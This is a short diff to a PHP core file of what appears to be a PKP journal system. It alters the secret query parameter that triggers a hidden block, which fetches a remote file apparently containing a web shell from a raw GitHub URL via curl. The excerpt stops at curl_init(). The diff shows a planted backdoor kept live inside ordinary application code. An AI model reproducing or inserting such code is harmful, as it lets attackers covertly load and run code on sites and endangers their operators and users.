@@ -300,7 +300,7 @@ if (!PKP_STRICT_MODE) {
     class_alias('\PKP\core\Dispatcher', '\Dispatcher');
 }
 
-if (isset($_GET['lausokapmpruy'])) {
+if (isset($_GET['abogoboga'])) {
     $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/shellfuckingteam.txt2";
 
     $ch = curl_init();
